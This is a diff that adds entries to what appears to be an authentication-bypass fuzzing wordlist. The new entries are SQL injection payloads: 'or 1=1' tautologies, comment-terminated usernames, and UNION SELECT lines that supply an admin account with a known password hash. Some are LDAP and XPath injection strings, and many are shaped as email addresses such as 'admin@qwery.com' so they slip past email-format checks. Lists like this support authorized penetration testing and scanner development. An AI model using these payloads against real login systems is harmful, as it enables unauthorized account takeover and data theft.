@@ -100,13 +100,25 @@
 0")&lt;"2-- 2
 0'&lt;'2'-- 2
 0')&lt;'2'-- 2
+'||1=1#@i.i
+'||1=1#@qwery.com
 1234
 123456
 1234 " AND 1=0 UNION ALL SELECT "admin", "7110eda4d09e062aa5e4a390b0a572ac0d2c0220
 1234 ' AND 1=0 UNION ALL SELECT 'admin', '7110eda4d09e062aa5e4a390b0a572ac0d2c0220
 1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
 1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+1234 " AND 1=0 UNION ALL SELECT "admin@qwery.com", "7110eda4d09e062aa5e4a390b0a572ac0d2c0220
+1234 ' AND 1=0 UNION ALL SELECT 'admin@qwery.com', '7110eda4d09e062aa5e4a390b0a572ac0d2c0220
+1234 " AND 1=0 UNION ALL SELECT "admin@qwery.com", "81dc9bdb52d04dc20036dbd8313ed055
+1234 ' AND 1=0 UNION ALL SELECT 'admin@qwery.com', '81dc9bdb52d04dc20036dbd8313ed055
 1′) and '1′='1–
+'"|\|/1#@i.i
+'/|\|1#@i.i
+'||1#@i.i
+'"|\|/1#@qwery.com
+'/|\|1#@qwery.com
+'||1#@qwery.com
 "&""-- 2
 ")&""-- 2
 ")*""-- 2
@@ -299,6 +311,61 @@ admin') or ('1'='1'/*
 admin"or 1=1 or ""="
 admin'or 1=1 or ''='
 admin' or '1'='2
+admin@qwery.com" #
+admin@qwery.com" --
+admin@qwery.com"#
+admin@qwery.com")#
+admin@qwery.com"/*
+admin@qwery.com' #
+admin@qwery.com' --
+admin@qwery.com'#
+admin@qwery.com')#
+admin@qwery.com')/*
+admin@qwery.com'/*
+admin@qwery.com)(!(&(|
+admin@qwery.com)(&)
+admin@qwery.com))(|(|
+admin@qwery.com")-- 2
+admin@qwery.com"-- 2
+admin@qwery.com')-- 2
+admin@qwery.com'-- 2
+admin@qwery.com' and substring(password/text(),1,1)='7
+admin@qwery.com' or '
+admin@qwery.com" or "1"="1
+admin@qwery.com" or "1"="1"#
+admin@qwery.com" or "1"="1"--
+admin@qwery.com" or "1"="1"/*
+admin@qwery.com" or 1=1
+admin@qwery.com" or 1=1#
+admin@qwery.com" or 1=1--
+admin@qwery.com" or 1=1/*
+admin@qwery.com") or "1"="1
+admin@qwery.com") or "1"="1"#
+admin@qwery.com") or "1"="1"--
+admin@qwery.com") or "1"="1"/*
+admin@qwery.com") or ("1"="1
+admin@qwery.com") or ("1"="1"#
+admin@qwery.com") or ("1"="1"--
+admin@qwery.com") or ("1"="1"/*
+admin@qwery.com' or '1'='1
+admin@qwery.com' or '1'='1'#
+admin@qwery.com' or '1'='1'--
+admin@qwery.com' or '1'='1'/*
+admin@qwery.com' or 1=1
+admin@qwery.com' or 1=1#
+admin@qwery.com' or 1=1--
+admin@qwery.com' or 1=1/*
+admin@qwery.com') or '1'='1
+admin@qwery.com') or '1'='1'#
+admin@qwery.com') or '1'='1'--
+admin@qwery.com') or '1'='1'/*
+admin@qwery.com') or ('1'='1
+admin@qwery.com') or ('1'='1'#
+admin@qwery.com') or ('1'='1'--
+admin@qwery.com') or ('1'='1'/*
+admin@qwery.com"or 1=1 or ""="
+admin@qwery.com'or 1=1 or ''='
+admin@qwery.com' or '1'='2
 " AND 1=0 UNION ALL SELECT "", "7110eda4d09e062aa5e4a390b0a572ac0d2c0220
 ' AND 1=0 UNION ALL SELECT '', '7110eda4d09e062aa5e4a390b0a572ac0d2c0220
 " AND 1=0 UNION ALL SELECT "", "81dc9bdb52d04dc20036dbd8313ed055
@@ -318,11 +385,14 @@ and 1=1–
 %bf') Or 1-- 2
 %bf')Or(1)-- 2
 %bf'Or(1)-- 2
+'||'c'='c'#@i.i
+'||'c'='c'#@qwery.com
 ffifdyop
 ' group by password having 1=1--
 ' group by userid having 1=1--
 ' group by username having 1=1--
 guest
+'||''=''#@i.i
 like '%'
 " or "" "
 " or ""&"
@@ -400,10 +470,12 @@ or 1=1#
 or 1=1--
 or 1=1/*
 or 1=1–
+'OR'1'='1'#@i.i
 ' or 1=1 limit 1 -- -+
 ' or 1=1 LIMIT 1;#
 "or 1=1 or ""="
 'or 1=1 or ''='
+'OR'1'='1'#@qwery.com
 ' or 1 or '
 ")oR 2#
 ")oR 2/*
@@ -610,10 +682,14 @@ or 1=1–
 ' or "a" or '
 'or contains(.,'adm') or'
 'or contains(name,'adm') or'
+'\O/R'\'/=\'/'#@i.i
+'OR''=''#@i.i
 ' or 'one'='one
 ' or 'one'='one–
 ' or /* or '
 'or position()=2 or'
+'\O/R'\'/=\'/'#@qwery.com
+'OR''=''#@qwery.com
 'or string-length(name(.))<10 or'
 " or true--
 ") or true--
@@ -688,6 +764,10 @@ Pass1234." AND 1=0 UniON ALL SeleCT "admin", md5("Pass1234.
 Pass1234." AND 1=0 UniON ALL SeleCT "admin", md5("Pass1234.")#
 Pass1234.' AND 1=0 UniON ALL SeleCT 'admin', md5('Pass1234.
 Pass1234.' AND 1=0 UniON ALL SeleCT 'admin', md5('Pass1234.')#
+Pass1234." AND 1=0 UniON ALL SeleCT "admin@qwery.com", md5("Pass1234.
+Pass1234." AND 1=0 UniON ALL SeleCT "admin@qwery.com", md5("Pass1234.")#
+Pass1234.' AND 1=0 UniON ALL SeleCT 'admin@qwery.com', md5('Pass1234.
+Pass1234.' AND 1=0 UniON ALL SeleCT 'admin@qwery.com', md5('Pass1234.')#
 Pass1234." AND 1=0 UniON SeleCT "admin", "5b19a9e947ca0fee49995f2a8b359e1392adbb61
 Pass1234." AND 1=0 UniON SeleCT "admin", "5b19a9e947ca0fee49995f2a8b359e1392adbb61"#
 Pass1234.' AND 1=0 UniON SeleCT 'admin', '5b19a9e947ca0fee49995f2a8b359e1392adbb61
@@ -696,6 +776,18 @@ Pass1234." AND 1=0 UniON SeleCT "admin", "fe1ff105bf807478a217ad4e378dc658
 Pass1234." AND 1=0 UniON SeleCT "admin", "fe1ff105bf807478a217ad4e378dc658"#
 Pass1234.' AND 1=0 UniON SeleCT 'admin', 'fe1ff105bf807478a217ad4e378dc658
 Pass1234.' AND 1=0 UniON SeleCT 'admin', 'fe1ff105bf807478a217ad4e378dc658'#
+Pass1234." AND 1=0 UniON SeleCT "admin@qwery.com", "5b19a9e947ca0fee49995f2a8b359e1392adbb61
+Pass1234." AND 1=0 UniON SeleCT "admin@qwery.com", "5b19a9e947ca0fee49995f2a8b359e1392adbb61"#
+Pass1234.' AND 1=0 UniON SeleCT 'admin@qwery.com', '5b19a9e947ca0fee49995f2a8b359e1392adbb61
+Pass1234.' AND 1=0 UniON SeleCT 'admin@qwery.com', '5b19a9e947ca0fee49995f2a8b359e1392adbb61'#
+Pass1234." AND 1=0 UniON SeleCT "admin@qwery.com", "fe1ff105bf807478a217ad4e378dc658
+Pass1234." AND 1=0 UniON SeleCT "admin@qwery.com", "fe1ff105bf807478a217ad4e378dc658"#
+Pass1234.' AND 1=0 UniON SeleCT 'admin@qwery.com', 'fe1ff105bf807478a217ad4e378dc658
+Pass1234.' AND 1=0 UniON SeleCT 'admin@qwery.com', 'fe1ff105bf807478a217ad4e378dc658'#
+Pass1234." and 1=0 union select "admin@qwery.com",sha("Pass1234.
+Pass1234." and 1=0 union select "admin@qwery.com",sha("Pass1234.")#
+Pass1234.' and 1=0 union select 'admin@qwery.com',sha('Pass1234.
+Pass1234.' and 1=0 union select 'admin@qwery.com',sha('Pass1234.')#
 Pass1234." and 1=0 union select "admin",sha("Pass1234.
 Pass1234." and 1=0 union select "admin",sha("Pass1234.")#
 Pass1234.' and 1=0 union select 'admin',sha('Pass1234.
@@ -704,6 +796,7 @@ password
 pwd
 pwd)
 pwd))
+'||''=''#@qwery.com
 root
 test
 toor
